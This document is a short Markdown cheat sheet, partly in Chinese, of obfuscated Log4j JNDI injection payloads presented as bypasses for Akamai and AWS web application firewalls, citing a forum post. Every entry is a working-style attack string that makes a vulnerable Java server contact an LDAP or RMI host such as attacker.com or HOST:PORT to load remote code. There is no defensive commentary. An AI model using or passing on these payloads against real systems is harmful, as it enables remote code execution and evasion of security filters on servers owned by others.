Akamai Bypass Log4j
```md
${jndi${123%25ff:-}:ldap://HOST:PORT/a}
```

#### Amazon AWS WAf Bypass

```md
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}

${jnd${123%25ff:-${123%25ff:-i:}}ldap://HOST:PORT/a}
```

### 其他的绕过payloads

```md
${lower:${:a:d:-${lower:}}jndi:}

${jndi:ldap://attacker.com/a}

${j${upper:${lower:n}}di:ldap://attacker.com/a}

${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.com/a}

${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${jndi:rmi://a.b.c}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://l}

${${::-j}ndi:rmi://}

${${lower:jndi}:${lower:rmi}://}

${${lower:${lower:jndi}}:${lower:rmi}://

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}:}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}

${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

${jndi:rmi://adsasd.asdasd.asdasd}

${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}

${j${upper:n:-}di:ldap://example.com:1389

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://kjhkjhkjh}

${j${main:\k5:-Nd}i${spring:k5:-:}ldap://kjhkjhkjh}

${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://kjhkjhkjh}

${j${::-nD}i${::-:}ldap://kjhkjhkjh}

${j${EnV:K5:-nD}i:ldap://kjhkjhkjh}

${j${loWer:Nd}i${uPper::}ldap}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${${upper:}jndi:ldap://example.com/a}

${j${upper::-n}di:ldap://example.com:1389/a}

${"£$_"£:a:d:-${lower:j}n}di:

${:a:d:-${lower:}j}ndi:

${:a:d:-${lower:j}n}di:
```



## 来源

```md
https://www.iculture.cc/forum-post/21632.html
```

